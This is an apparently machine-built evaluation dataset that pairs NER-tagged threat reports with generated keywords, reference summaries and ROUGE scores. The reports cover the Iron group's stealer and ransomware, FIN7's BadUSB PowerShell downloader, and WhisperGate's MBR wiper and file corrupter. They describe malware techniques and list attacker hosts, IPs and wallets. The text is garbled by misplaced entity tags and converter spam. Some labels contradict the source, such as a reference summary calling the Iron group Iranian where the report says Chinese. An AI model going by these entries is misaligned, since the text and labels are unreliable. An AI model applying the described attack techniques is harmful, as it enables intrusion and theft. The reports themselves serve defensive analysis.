[PERSON] Iron ransomware . It seems that the wallet & payment portal addresses are identical to the ones that [PERSON] Bart observed . Requested ransom decreased from [PERCENT] 0.2 [PERCENT] BTC to [CARDINAL] 0.05 BTC , most likely due to the lack of payment they received . PDFmyURL converts any url to pdf!**Nobody paid so they decreased ransom to [MONEY] 0.05 [MONEY] BTC3 . Stealing cryptocurrency from the victim \u2019s workstation : Iron backdoor would drop the latest voidtool Everything search utility and actually silent install it on the victim \u2019s workstation using msiexec . After installation was completed , [ORG] Iron [ORG] Backdoor uses Everything in order to find files that are likely to contain cryptocurrency wallets , by filename patterns in both [LANGUAGE] English and [NORP] Chinese . Full list of patterns extracted from sample : \u2013 Etherenum keystore filename \u2013 * litecoin*.txtPDFmyURL converts any url to pdf ! \u2013 * * .txt \u2013 * coinbase*4 . Hijack on - going payments in cryptocurrency : IronStealer constantly monitors the user \u2019s clipboard for Bitcoin , [ORG] Monero [ORG] & [ORG] Ethereum wallet address regex patterns . Once matched , it will automatically replace it with the attacker \u2019s wallet address so the victim would unknowingly transfer money to the attacker \u2019s account : [PERSON] Pastebin [PERSON] Account : As part of the investigation , we also tried to figure out what additional information we may learn from the attacker \u2019s Pastebin account : PDFmyURL converts any url to pdf!The account was probably created using the mail fineisgood123@gmail[.]com \u2013 the same email address used to register blockbitcoin[.]com ( the attacker \u2019s crypto - mining pool & malware host ) and swb[.]one ( Old server used to host malware & leaked files . replaced by u.cacheoffer[.]tk):1 . Index.html : HTML page referring to a fake Firefox download page . [CARDINAL] 2 . crystal_ext - min + angular : [ORG] JS inject using malicious [FAC] Chrome extension . [CARDINAL] 3 . android : This paste holds a command line for an unknown backdoored application to execute on infected [ORG] Android devices . This command line invokes remote [GPE] Metasploit stager ( android.apk ) and drops cpuminer [CARDINAL] 2.3.2 ( minerd.txt ) built for ARM processor . Considering the last update date ( [CARDINAL] 18/11/17 ) and the low number of views , we believe this paste is obsolete.4 . androidminer : Holds the cpuminer command line to execute for unknown malicious android applications , at the time of writing this post , this paste received nearly 2000 hits . PDFmyURL converts any url to [ORG] pdf!Aikapool[.]com is a public mining pool and port [DATE] 7915 is used for [ORG] DogeCoin : The username ( myapp2150 ) was used to register accounts in several forums and on [NORP] Reddit . These accounts were used to advertise fake \u201c blockchain exploit tool \u201d , which infects the victim \u2019s machine with [PERSON] Cobalt [PERSON] Strike , using a similar VBScript to the one found by [NORP] Malwrologist ( ps5.sct).XAttacker : Copy of [ORG] XAttacker [ORG] PHP remote file upload script . miner : [ORG] Holds payload URL , as mentioned above ( IronStealer).FAQ : How many victims are there ? It is hard to define for sure , , but to our knowledge , the total of the attacker \u2019s pastes received around [CARDINAL] 14 K views , ~11 K for dropped payload URL and ~2k for the android miner paste . Based on that , we estimate that the group has successfully infected , a few thousandsPDFmyURL converts any url to [NORP] pdf!victims . Who is [PERSON] Iron group ? We suspect that the person or persons behind the group are [NORP] Chinese , due in part to the following findings : . There were several leftover comments in the plugin in [LANGUAGE] Chinese . . [PERSON] Root [PERSON] CA [PERSON] Certificate password ( \u2018 f*ck your mom123 \u2019 was in [LANGUAGE] Mandarin ) We also suspect most of the victims are located in [GPE] China , because of the following findings : . Searches for wallet file names in [NORP] Chinese on victims \u2019 workstations . . Wo n\u2019t install persistence if [NORP] Qhioo360(popular [NORP] Chinese AV ) is foundIOCS : blockbitcoin[.]com pool.blockbitcoin[.]com ssl2.blockbitcoin[.]com xmr.enjoytopic[.]tk down.cacheoffer[.]tk dzebppteh32lz.cloudfront[.]net dazqc4f140wtl.cloudfront[.]net androidapt.s3 - accelerate.amazonaws[.]com androidapt.s3 - accelerate.amazonaws[.]com winapt.s3 - accelerate.amazonaws[.]com Ex - officer in the IDF - CERT . [ORG] Malware analyst and [ORG] Reverse [ORG] Engineer with vast experience in dealing with Nation - sponsored cyber attacks . | omri@intezer.comTags : backdoorbitcoincryptominercybercrimemalwareransomwarechinaironShare : Register to our free communityTry it nowPDFmyURL converts any url to pdf!Executable And Linkable [PERSON] Format 101 Pa \u2026 [ORG] Digital Certificates- When The Chain Of T \u2026 \uf104\uf105Home ProductsIntezer Analyze \u2122 Compromise AssessmentTechnology CompanyAboutNews and EventsIntezer Blog Contact \u00a9 Intezer.com 2017 All rights reservedTerms ofUsePrivacyPolicy\uf099\uf0e1\uf09a\uf167PDFmyURL converts any url to pdf !", "generated_text": "April 2018; researchers; the Iron cybercrime group; the group; HackingTeam; the Iron ransomware; the Iron ransomware; the Iron ransomware; ransomware versions; Windows; Linux; Android; the backdoor; the malware; the IronStealer; DynamicCall; DynamicSandbox; VMWare; IoC; a shellcode; credentials; the C&C server; the malware; a keylogger; the C&C server; the keylogger; data; the network; the remote control system; the hacker; the Iron Backdoor.", "ref_text": "<START-1>The report analyzes malware developed by an Iranian cybercrime group called Iron. The group has been active for around 18 months and has created backdoors, crypto-miners, and ransomware for Windows, Linux, and Android. Researchers discovered a new Iron backdoor using leaked HackingTeam source code. The backdoor installs the Xagent crypto-miner worm or Iron ransomware onto systems. It also steals cryptocurrency wallet files and hijacks crypto transactions. The malware uses a signed Chrome extension for stealthy crypto-mining and payment hijacking. It abuses HackingTeam anti-VM checks and dynamic function calling to avoid detection. The attackers used a network of Pastebin pastes for C2. Based on forum links and Chinese language artifacts, Iron is suspected to be a Chinese group. While not the most advanced actor, the rapid development across platforms shows the group's capabilities and business model. The report includes full technical analysis and indicators of compromise. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5428571428571428, "gpt3/lexical/rouge_rouge2": 0.1654676258992806, "gpt3/lexical/rouge_rougeL": 0.2571428571428571, "gpt3/lexical/rouge_rougeLsum": 0.2571428571428571, "gpt3_generated_text": ["In April 2018, researchers discovered a previously unknown backdoor developed by the Iron cybercrime group, the same group behind the Iron ransomware. Over the past 18 months, the Iron group has developed multiple types of malware for Windows, Linux, and Android platforms, successfully infecting thousands of victims. The backdoor sample analyzed was found to be partially based on HackingTeam's leaked RCS source code, using two main functions from it. The Iron Backdoor also uses a Virtual Machine detection code and the DynamicCall module from HackingTeam's library. Additionally, a patched version of the Adblock Plus chrome extension is used to inject crypto-mining and payment hijacking modules. The malware runs in the background and sets up a scheduled task to launch the browser if it's not already running."]}, {"split_name": "val", "sample_id": "val_70", "prompt_text": "Extract the keywords: FIN7 Uses Flash Drives to Spread Remote Access [DATE] Trojangeminiadvisory.io/fin7-flash-drives-spread-remote-access-trojanJanuary [DATE] 13 , [ORG] 2022Executive [ORG] Summary [ORG] Recorded [ORG] Future analysts continue to monitor the activities of the [ORG] FIN7 group as they adapt and expand their cybercrime operations . [ORG] Gemini has conducted a more in - depth investigation into these types of attack after a [ORG] Gemini source provided analysts with the file \u201c sketch_jul31a.ino \u201d , which was linked to [ORG] FIN7 \u2019s [ORG] BadUSB attacks . The file had the extension ( .INO ) , indicating it contained the source code for an [ORG] Arduino \u201c sketch \u201d ( the [ORG] Arduino term for a program ) . BleepingComputer also recently released a public report on [ORG] FIN7 \u2019s use of the \u201c BadUSB \u201d attack method , outlining the activity around this type of attack . The [ORG] Arduino platform provides a common set of software utilities and libraries for constructing programs to run on platform - compatible microcontrollers . The platform uses a simplified version of the [LANGUAGE] C++ programming language and provides foundational libraries , an integrated development environment for constructing the sketch , a compiler , and a means of uploading the compiled sketch to a device with a compatible microcontroller . In the [ORG] Arduino ecosystem , the microcontroller executes the compiled sketch , making it operating system ( OS ) agnostic . Hackers have leveraged the [ORG] Arduino platform to create trojanized [ORG] USB devices that emulate keyboards and inject keystrokes . In most cases , the sketches on these trojanized devices connect to a malicious actor \u2019s file repository , download additional software , and install it on the victim system . In [DATE] March [DATE] 2020,1/7security analysts from [PERSON] Trustwave [PERSON] SpiderLabs reported that FIN7 targeted a [GPE] US company by sending one of its employees a [ORG] USB device trojanized with keystroke injection malware . Key FindingsFIN7 used an [ORG] Arduino sketch file called \u201c sketch_jul31a.ino \u201d to install malware on [ORG] USB devices as part of BadUSB attacks . FIN7 uses the trojanized [ORG] USB devices to ultimately load [FAC] the [FAC] IceBot [FAC] Remote [FAC] Access [FAC] Trojan ( RAT ) , resulting in FIN7 gaining unauthorized remote access to systems within victims \u2019 networks . We identified [CARDINAL] 9 [ORG] IP addresses that host FIN7 \u2019s malicious payloads and [CARDINAL] 3 FIN7 command - and - control ( C2 ) servers , [CARDINAL] one of which contains a control panel for managing infected systems . The control panel displayed a list of systems infected with the IceBot RAT and pertinent information about each installation . [PERSON] Attack [PERSON] Analysis [PERSON] Gemini specialists conducted the analysis of the file \u201c sketch_jul31a.ino \u201d . \u201c .INO \u201d is a file extension associated with the [ORG] Arduino microcontroller programming platform , while \u201c sketch \u201d is the platform \u2019s term for a program . Malicious actors have taken advantage of the [ORG] Arduino platform and its support for microcontrollers installed on [ORG] USB devices to install malware . When a [ORG] USB is maliciously used as a virtual keyboard , the attack is called a \u201c keystroke injection \u201d , \u201c BadUSB \u201d , or \u201c Rubber Ducky \u201d attack . Figure [CARDINAL] 1 : The attack flow of the [CARDINAL] Fin7 [ORG] USB attack ( Source : Recorded Future)This attack \u2019s use of keyboard injection capitalizes on [ORG] Microsoft Windows \u2019 default behavior of automatically trusting [ORG] USB keyboards . It uses [ORG] Arduino - compatible microcontrollers that are hidden in what appear to be typical [ORG] USB devices but are actually programmed to function as virtual keyboards ( usually based on [PERSON] ESP8266 , Atmega32u4 , or ATtiny85 microcontrollers ) . The sketch sends keystrokes to activate a shell and execute additional commands on the victim system.2/7Figure [CARDINAL] 2 : [ORG] Arduino sketch source code from the file \u201c sketch_jul31a.ino \u201d ( Source : Recorded Future)The \u201c sketch_jul31a.ino \u201d file ( Figure [CARDINAL] 2 ) contains the source code for an [ORG] Arduino sketch designed to run scripts on a [PRODUCT] Windows system . [ORDINAL] First , the sketch opens the \u201c [WORK_OF_ART] Run \u201d dialog by sending the \u201c Windows \u201d + \u201c R \u201d keys . Next , it sends the keystrokes for \u201c cmd.exe \u201d to the \u201c [WORK_OF_ART] Run \u201d dialog to execute a command prompt . The sketch then sends keystrokes to execute \u201c powershell.exe -w h -command Invoke - Expression \u201d , which runs the [ORG] PowerShell interpreter in a hidden window and executes a script that is passed in - line . This script downloads and installs malware from the [ORG] IP address [CARDINAL] 206.54.190[.]230 . As shown in the table below , further analysis revealed [CARDINAL] 8 additional [ORG] IP addresses used to host [ORG] FIN7 \u2019s malicious payload . IP AddressFirst SeenLast Seen138.124.180[.]127 2021 - 07 - 29 12:26:10 2021 - 08 - 10 12:03:34185.232.170[.]242021 - 07 - 29 9:21:312021 - 10 - 21 13:03:42185.233.80[.]1492021 - 07 - 29 9:50:262021 - 10 - 21 14:38:00185.53.46[.]1002021 - 07 - 29 13:47:48 2021 - 11 - 20 10:08:13206.54.191[.]372021 - 07 - 29 12:37:53 2021 - 10 - 21 16:13:5837.1.213[.]1942021 - 07 - 29 10:48:31 2021 - 08 - 10 9:26:0145.142.215[.]1482021 - 10 - 21 15:17:31 2021 - 10 - 21 15:17:315.252.177[.]2152021 - 07 - 29 [TIME] 14:18:09 2021 - 10 - 21 11:20:573/7Figure [CARDINAL] 3 : Contents of the downloaded file wis.txt ( Source : Recorded Future)After downloading the file \u201c wis.txt \u201d from the malicious server , the [ORG] PowerShell script decodes the file via the command \u201c certutil -decode hex \u201d , a command - line program and routine that is part of [ORG] Microsoft [ORG] Windows [ORG] Certificate [ORG] Services . The decoding results in another [ORG] PowerShell script , saved to \u201c [PERSON] C:\\windows\\temp\\wis.ps1\u201d . Figure [CARDINAL] 4 : Result of hex - decoding wis.txt into wis.ps1 ( Source : Recorded Future)This script contains a large block of compressed data , which the script decompresses using the [ORG] PowerShell IO.Compression . DeflateStream routine . The result is a .NET assembly ( executable module ) , which the script loads into the current execution context through a call to Reflection . Assembly::Load.4/7Figure [CARDINAL] 5 : The function for decoding and decrypting the reflective loader shellcode , rewritten to Python . ( Source : Recorded Future)Once loaded , the .NET assembly decodes a block of data that has been XOR - obfuscated with the key \u201c qawsed1q2w3e \u201d . The result is a reflective loader shellcode that installs [FAC] the [FAC] IceBot [FAC] Remote [FAC] Access [FAC] Trojan ( RAT ) , previously known as Lizar , Tirion , and Diceloader . Remote Access Trojan AnalysisThe [ORG] RAT executable dropped by \u201c sketch_jul31a.ino \u201d contains [CARDINAL] 2 command - and - control ( C2 ) addresses : [CARDINAL] 199.80.55[.]66 and [CARDINAL] 207.246.92[.]213 . Analysis of the fingerprints for these [CARDINAL] 2 [ORG] IP addresses reveals an additional C2 server hosted on [ORG] IP [ORG] 185.250.151[.]126 , and we were able to view the [CARDINAL] C2 control panel . Figure [CARDINAL] 6 : Hex View snapshot of IceBot showing C2 IP addresses ( Source : Recorded Future)Figure [CARDINAL] 7 : The main window of the control panel of IceBot version [CARDINAL] 2.1.1 . The [ORG] IP address of the C2 server is [DATE] 185.250.151[.]126:443 . ( Source : Recorded Future)The control panel displays a list of systems infected with the [ORG] RAT , along with pertinent information about each installation , such as [ORG] IP address , OS , process identifier ( [ORG] PID ) , antivirus software , communication history , and next update interval.5/7Figure [CARDINAL] 8 : The list of commands for the control panel of the RAT ( Source : Recorded Future)Selecting an infected system and bringing up a context menu allows the threat actor to interact with the [ORG] RAT and execute commands . As can be seen in Figure [CARDINAL] 8 , several commands are available for managing The use of trojanized [ORG] USB devices for keystroke injection is not a new technique , even for FIN7 . Typically the attack targets specific persons with access to the computer systems of the intended victim company . As FIN7 has recently ventured into ransomware , it makes sense for them to look for alternative avenues of infecting computers that are monitored by layers of protective systems , such as firewalls , email scanners , proxy servers , and endpoint security . The tactics and techniques involved in trojanized [ORG] USB attacks enable FIN7 actors to avoid many of these network - level and endpoint protections by dispensing with malware transmission over the network , minimizing the use of files on disk and employing multiple layers of encoding of the malware \u2019s scripts and executable code . Pertinently , FIN7 recently created \u201c [WORK_OF_ART] Bastion [WORK_OF_ART] Secure \u201d , a fake information security company , and employed system administrators to unknowingly assist in system exploitation . It is possible that trojanized USBs are being constructed and used by these administrators for penetration testing . Alternatively , they might also6/7be providing trojanized USBs to clients or prospective clients through some form of ruse ( for example , telling the client it contains documentation on the fake company \u2019s services ) . In either case , the clients or prospective clients could become victims of a trojanized [ORG] USB attack , resulting in FIN7 gaining unauthorized remote access to systems within victims [WORK_OF_ART] \u2019 [WORK_OF_ART] networks.7/7", "generated_text": "FIN7; use; a USB device; Keystroke injection malware; USB devices; Android; Windows; use; USB keyboards; ESP8266; ATmega32u4; Attiny85; the Arduino platform; a program; the coin; a payload; a USB device; the IceBot Remote Access Trojan; unauthorized remote access; systems; a control panel; control; the remote access trojan; the RAT; the USB; detection; the attacker; the victim system; the group; IP addresses; defense; the attack; this attack; the RAT; capabilities; security; intelligence.", "ref_text": "<START-1>The cybercrime group FIN7 has been using \"BadUSB\" attacks to spread malware. They distribute USB devices containing malicious Arduino sketches that act as keyboards. When plugged in, the sketch executes PowerShell to download and install the IceBot remote access trojan (RAT). This allows FIN7 to gain unauthorized access to target networks. Analysis of the sketch code shows it opens a hidden PowerShell window to download the trojan from IP addresses linked to FIN7. The RAT then connects to FIN7 command and control servers. A control panel was discovered showing systems infected with IceBot, including info like IP, OS, antivirus, and options to interact with the RAT. This attack method avoids firewalls and email filters by not transmitting malware over the network. Encoding and scripts minimize malware files for stealth. FIN7 recently created a fake security company potentially to construct trojanized USBs. They may be using unwitting admins or sending them to clients for social engineering. The USB-based attack represents an evolution in tactics for FIN7 to gain persistent access and evade protections as they expand into ransomware operations. Defenses should focus on physical media controls and monitoring for suspicious USB activities. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.46551724137931033, "gpt3/lexical/rouge_rouge2": 0.15028901734104047, "gpt3/lexical/rouge_rougeL": 0.2471264367816092, "gpt3/lexical/rouge_rougeLsum": 0.2471264367816092, "gpt3_generated_text": ["The article discusses the activities of the cybercrime group FIN7, particularly their use of USB devices to spread malware. The group has utilized the Arduino platform to create trojanized USB devices that act as virtual keyboards and inject keystrokes into victim systems. By sending a malicious USB device to a target, FIN7 gains unauthorized remote access to the victim's network. The article provides an analysis of a specific Arduino sketch file used by FIN7, which installs the IceBot Remote Access Trojan (RAT) on the victim system. The analysis identified several IP addresses hosting FIN7's malicious payloads and command-and-control servers. The control panel of one of these servers displayed information about infected systems. The attack takes advantage of Microsoft Windows' default behavior of automatically trusting USB keyboards. The article also includes the source code of the Arduino sketch used by FIN7 to execute commands on the victim system. Overall, the article highlights th"]}, {"split_name": "val", "sample_id": "val_71", "prompt_text": "Extract the keywords: Destructive malware targeting [GPE] Ukrainian organizationsmicrosoft.com/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizationsJanuary [CARDINAL] 16 , [ORG] 2022Microsoft [ORG] Threat [ORG] Intelligence [ORG] Center ( MSTIC ) has identified evidence of a destructive malware operation targeting multiple organizations in [GPE] Ukraine . This malware [ORDINAL] first appeared on victim systems in [GPE] Ukraine on [DATE] January [DATE] 13 , [DATE] 2022 . [ORG] Microsoft is aware of the ongoing geopolitical events in [GPE] Ukraine and surrounding region and encourages organizations to use the information in this post to proactively protect from any malicious activity . While our investigation is continuing , [ORG] MSTIC has not found any notable associations between this observed activity , tracked as DEV-0586 , and other known activity groups . [ORG] MSTIC assesses that the malware , which is designed to look like ransomware but lacking a ransom recovery mechanism , is intended to be destructive and designed to render targeted devices inoperable rather than to obtain a ransom . At present and based on [ORG] Microsoft visibility , our investigation teams have identified the malware on [CARDINAL] dozens of impacted systems and that number could grow as our investigation continues . These systems span multiple government , non - profit , and information technology organizations , all based in [GPE] Ukraine . We do not know the current stage of this attacker \u2019s operational cycle or how many other victim organizations may exist in [GPE] Ukraine or other geographic locations . However , it is unlikely these impacted systems represent the full scope of impact as other organizations are reporting . Given the scale of the observed intrusions , [ORG] MSTIC is not able to assess intent of the identified destructive actions but does believe these actions represent an elevated risk to any government agency , non - profit or enterprise located or with systems in [GPE] Ukraine . We strongly encourage all organizations to immediately conduct a thorough investigation and to implement defenses using the information provided in this post . [ORG] MSTIC will update this blog as we have additional information to share . As with any observed nation - state actor activity , [ORG] Microsoft directly and proactively notifies customers that have been targeted or compromised , providing them with the information they need to guide their investigations . [ORG] MSTIC is also actively working with members of the global security community and other strategic partners to share information that can address this evolving threat through multiple channels . [ORG] Microsoft uses DEV- # # # [MONEY] # designations as a temporary name given to an unknown , emerging , or a1/4developing cluster of threat activity , allowing [ORG] MSTIC to track it as a unique set of information until we reach a high confidence about the origin or identity of the actor behind the activity . Once it meets the criteria , a [ORG] DEV is converted to a named actor or merged with existing actors . Observed actor activityOn [DATE] January [DATE] 13 , [ORG] Microsoft identified intrusion activity originating from [GPE] Ukraine that appeared to be possible [ORG] Master [ORG] Boot [ORG] Records ( MBR ) Wiper activity . During our investigation , we found a unique malware capability being used in intrusion attacks against multiple victim organizations in [GPE] Ukraine . Stage 1 : Overwrite [PERSON] Master [PERSON] Boot [PERSON] Record to display a faked ransom noteThe malware resides in various working directories , including [ORG] C:\\PerfLogs , C:\\ProgramData , [GPE] C:\\ , and C:\\temp , and is often named stage1.exe . In the observed intrusions , the malware executes via Impacket , a publicly available capability often used by threat actors for lateral movement and execution . The [CARDINAL] two - stage malware overwrites [PRODUCT] the [PRODUCT] Master [PRODUCT] Boot [PRODUCT] Record ( MBR ) on victim systems with a ransom note ( Stage 1 ) . The [ORG] MBR is the part of a hard drive that tells the computer how to load its operating system . The ransom note contains a Bitcoin wallet and Tox ID ( a unique account identifier used in the Tox encrypted messaging protocol ) that have not been previously observed by MSTIC : Your hard drive has been corrupted . In case you want to recover all hard drives of your organization , You should pay us $ [MONEY] 10k via bitcoin wallet 1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv and send message via tox ID 8BEDC411012A33BA34F49130D0F186993C6A32DAD8976F6A5D82C1ED23054C057ECED5496F65 with your organization name . We will contact you to give further instructions . The malware executes when the associated device is powered down . Overwriting the [ORG] MBR is atypical for cybercriminal ransomware . In reality , the ransomware note is a ruse and that the malware destructs [ORG] MBR and the contents of the files it targets . There are several reasons why this activity is inconsistent with cybercriminal ransomware activity observed by [ORG] MSTIC , including : Ransomware payloads are typically customized per victim . In this case , the same ransom payload was observed at multiple victims . Virtually all ransomware encrypts the contents of files on the filesystem . The malware in this case overwrites the [ORG] MBR with no mechanism for recovery . Explicit payment amounts and cryptocurrency wallet addresses are rarely specified in modern criminal ransom notes , but were specified by [DATE] DEV-0586 . The same Bitcoin wallet address has been observed across all DEV-0586 intrusions and at the time of analysis , the only activity was a small transfer on [DATE] January [DATE] 14 . It is rare for the communication method to be only a Tox ID , an identifier for use with the Tox encrypted messaging protocol . Typically , there are websites with support forums or multiple methods of contact ( including email ) to make it easy for the victim to successfully make contact . Most criminal ransom notes include a custom ID that a victim is instructed to send in their communications to the attackers . This is an important part of the process where the custom ID maps on the backend of the ransomware operation to a victim - specific decryption key . The ransom note in this case does not include a custom ID.2/4Microsoft will continue to monitor [DATE] DEV-0586 activity and implement protections for our customers . The current detections , advanced detections , and IOCs in place across our security products are detailed below . Stage 2 : File corrupter [ORG] malwareStage2.exe is a downloader for a malicious file corrupter malware . Upon execution , stage2.exe downloads the next - stage malware hosted on a [ORG] Discord channel , with the download link hardcoded in the downloader . The next - stage malware can best be described as a malicious file corrupter . Once executed in memory , the corrupter locates files in certain directories on the system with [CARDINAL] one of the following hardcoded file extensions:.3DM .3DS .7Z .ACCDB .AI .ARC .ASC .ASM .ASP .ASPX .BACKUP .BAK .BAT .BMP .BRD .BZ .BZ2 .CGM .CLASS .CMD .CONFIG .CPP .CRT .CS .CSR .CSV .DB .DBF .DCH .DER .DIF .DIP .DJVU.SH .DOC .DOCB .DOCM .DOCX .DOT .DOTM .DOTX .DWG .EDB .EML .FRM .GIF .GO .GZ .HDD .HTM .HTML .HWP .IBD .INC .INI .ISO .JAR .JAVA .JPEG .JPG .JS .JSP .KDBX .KEY .LAY .LAY6 .LDF .LOG .MAX .MDB .MDF .MML .MSG .MYD .MYI .NEF .NVRAM .ODB .ODG .ODP .ODS .ODT .OGG .ONETOC2 .OST .OTG .OTP .OTS .OTT .P12 .PAQ .PAS .PDF .PEM .PFX .PHP .PHP3 .PHP4 .PHP5 .PHP6 .PHP7 .PHPS .PHTML .PL .PNG .POT .POTM .POTX .PPAM .PPK .PPS .PPSM .PPSX .PPT .PPTM .PPTX .PS1 .PSD .PST .PY .RAR .RAW .RB .RTF .SAV .SCH .SHTML .SLDM .SLDX .SLK .SLN .SNT .SQ3 .SQL .SQLITE3 .SQLITEDB .STC .STD .STI .STW .SUO .SVG .SXC .SXD .SXI .SXM .SXW .TAR .TBK .TGZ .TIF .TIFF .TXT .UOP .UOT .VB .VBS .VCD .VDI .VHD .VMDK .VMEM .VMSD .VMSN .VMSS .VMTM .VMTX .VMX .VMXF .VSD .VSDX .VSWP .WAR .WB2 .WK1 .WKS .XHTML .XLC .XLM .XLS .XLSB .XLSM .XLSX .XLT .XLTM .XLTX .XLW .YML .ZIPIf a file carries [CARDINAL] one of the extensions above , the corrupter overwrites the contents of the file with a fixed number of 0xCC bytes ( total file size of [CARDINAL] 1 MB ) . After overwriting the contents , the destructor renames each file with a seemingly random four - byte extension . Analysis of this malware is ongoing . Recommended customer [PERSON] actionsMSTIC and the [ORG] Microsoft security teams are working to create and implement detections for this activity . To date , [ORG] Microsoft has implemented protections to detect this malware family as WhisperGate ( e.g. , [NORP] DoS : Win32 / WhisperGate . A!dha ) via [ORG] Microsoft [ORG] Defender [ORG] Antivirus and [PERSON] Microsoft [PERSON] Defender for Endpoint , wherever these are deployed on - premises and cloud environments . We are continuing the investigation and will share significant updates with affected customers , as well as public and private sector partners , as get more information . The techniques used by the actor and described in the this post can be mitigated by adopting the security considerations provided below : Use the included indicators of compromise to investigate whether they exist in your environment and assess for potential intrusion . Review all authentication activity for remote access infrastructure , with a particular focus on accounts configured with single factor authentication , to confirm authenticity and investigate any anomalous activity . Enable multifactor authentication ( [ORG] MFA ) to mitigate potentially compromised credentials and ensure that [ORG] MFA is enforced for all remote connectivity . NOTE : [ORG] Microsoft strongly encourages all customers download and use password - less solutions like [ORG] Microsoft [ORG] Authenticator to secure accounts . Enable Controlled folder [LAW] Access ( CFA ) in [ORG] Microsoft [ORG] Defender for Endpoint to prevent [ORG] MBR / [ORG] VBR modification . Indicators of compromise ( IOCs)3/4The following list provides IOCs observed during our investigation . We encourage customers to investigate these indicators in their environments and implement detections and protections to identify [CARDINAL] 2>&1Command lineNOTE : These indicators should not be considered exhaustive for this observed activity . DetectionsMicrosoft 365 DefenderAntivirusHash of stage1.exeHash of intrusions.4/4", "generated_text": "Microsoft Threat Intelligence Center; MSTIC; evidence; a destructive malware operation; Ukrainian organizations; January 13; ransomware; the malware; a faked ransom note; the Master Boot Record; the ransom note; the computer; the ransom note; a Bitcoin wallet; Tox ID; the ransom note; the chain; a wallet; a Bitcoin wallet; credentials; the ransom note; a Bitcoin wallet; Tox ID; the ransom note; a Bitcoin wallet; the ransom note; a Bitcoin wallet; data; the ransom note; a Bitcoin wallet; a Tox ID; a malicious script; the malicious script; the attacker; the ransom note; the campaign; C&C servers; organizations; the IOCs; detection; the threat.", "ref_text": "<START-1>The document describes destructive malware activity targeting organizations in Ukraine that was identified by Microsoft on January 13, 2022. The malware overwrites the Master Boot Record (MBR) of devices to display a fake ransom note, but lacks any actual ransom recovery mechanism. Microsoft assesses that the malware is intended to be destructive rather than obtain a ransom, with the goal of rendering targeted devices inoperable. Dozens of systems across government, non-profit, and IT organizations in Ukraine have been impacted so far. The malware has two stages - first overwriting the MBR with a fake ransom note, then downloading a corrupting component that locates and overwrites files with certain extensions to make them inaccessible. Indicators of compromise like file hashes, command lines, and the hardcoded Bitcoin wallet are provided. Microsoft has implemented detections for the malware, which they track as WhisperGate, in Defender products. Recommended actions for organizations include investigating IOCs, reviewing remote access logs for anomalies, enabling multifactor authentication, and using features like Controlled Folder Access to block file modifications. The activity is attributed to a new temporary cluster DEV-0586, with no known associations to existing groups. The investigation is ongoing and Microsoft is sharing information to help organizations defend against this threat. In summary, the document provides details on new wiper malware used in intrusions targeting Ukraine, along with mitigation advice and IOCs to facilitate detection and response. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5333333333333333, "gpt3/lexical/rouge_rouge2": 0.17866004962779156, "gpt3/lexical/rouge_rougeL": 0.271604938271605, "gpt3/lexical/rouge_rougeLsum": 0.271604938271605, "gpt3_generated_text": ["The Microsoft Threat Intelligence Center (MSTIC) has discovered a destructive malware operation targeting multiple organizations in Ukraine. The malware, known as DEV-0586, first appeared on January 13, 2022. It is designed to look like ransomware but lacks a ransom recovery mechanism, indicating that its purpose is to render targeted devices inoperable. The malware overwrites the Master Boot Record (MBR) on victim systems with a faked ransom note containing a Bitcoin wallet and Tox ID. However, the ransom note is a ruse, and the malware destroys the MBR and the contents of the targeted files. MSTIC has identified the malware on dozens of impacted systems, but it is likely that more organizations have been affected. The full scope of impact is still unknown. MSTIC is actively investigating the malware and encourages organizations to conduct thorough investigations and implement defenses. Microsoft is working with the global security community and strategic partners to address this evolving threat. The malware's origin or identity is still unknown, and MSTIC uses the DEV-# designation until more information is available."]}, {"split_name": "val", "sample_id": "val_72", "prompt_text": "Extract the keywords: Operation Bleeding Bearelastic.github.io/security-research/malware/2022/01/01.operation-bleeding-bear/articleBleeding [ORG] Bear [ORG] Destructive Ransomware2022 - 01 - 19Key [ORG] Takeaways\u00b6Elastic [ORG] Security provides new analysis and insights into targeted campaign against [GPE] Ukraine organizations with destructive malware reported over [DATE] the [DATE] weekend [DATE] of [DATE] Jan 15 , [DATE] 2022 Techniques observed include process hollowing , tampering with [PERSON] Windows [PERSON] Defender , using a Master Boot Record ( [ORG] MBR ) wiper , and file corruptor component [ORG] Elastic [ORG] Security prevents each stage of the described campaign using prebuilt endpoint protection features1/13Overview\u00b6 Over [DATE] this [DATE] past [DATE] weekend ( [DATE] 1/15/2022 ) , [ORG] Microsoft released details of a new campaign targeting [NORP] Ukrainian government entities and organizations with destructive malware . In a multi - staged attack , [CARDINAL] one malware component known as [ORG] WhisperGate utilizes a wiping capability on [WORK_OF_ART] the [WORK_OF_ART] Master [WORK_OF_ART] Boot [WORK_OF_ART] Record ( MBR ) , making any machine impacted inoperable after boot - up . Within another stage , a file infector component is used to corrupt files in specific directories with specific file extensions . The elements used in this campaign lack the common characteristics of a ransomware compromise \u2014 in this case the adversary uses the same Bitcoin address for each victim and offers no sign of intent to help decrypt the victim \u2019s machine.2/13Translation : Update information on the cyber attack on [DATE] January 13 - 14 on [NORP] Ukrainian infrastructure . For a coordinated response report the incident : report@ncscc.gov.uaElastic users are fully protected from attacks like these through our advanced malware detection and [ORG] Ransomware [ORG] Protection capabilities in the platform , and the Elastic Security team continues to monitor these events . This case highlights the importance of prevention when it \u2019s up against ransomware and malware with destructive capabilities . Malware analysis breakdown ( Stages 1 - 4)\u00b6Stage [CARDINAL] 1 : WhisperGate MBR payload\u00b6 [WORK_OF_ART] The [WORK_OF_ART] Master [WORK_OF_ART] Boot [WORK_OF_ART] Record ( MBR ) is software that executes stored start - up information and , most importantly , informs the system of the location of the bootable partition on disk that contains the user 's operating system . If tampered with , this can result in the system being inoperable \u2014 a common tactic for malware and ransomware campaigns over [DATE] the [DATE] years to interrupt operation of the infected system . The stage [CARDINAL] 1 binary is named stage1.exe and has low complexity . A [DATE] 8192 byte buffer containing the new [ORG] MBR data that includes the ransom note is allocated on the stack . A file handle is retrieved from CreateFileW pointing to the [ORDINAL] first physical drive which represents the [ORG] MBR . That file handle is then called by [ORG] WriteFile which takes [CARDINAL] only [CARDINAL] 512 bytes from the buffer writing over the Master Boot Record.3/13The host will subsequently be rendered inoperable during the next boot - up sequence . Below is a 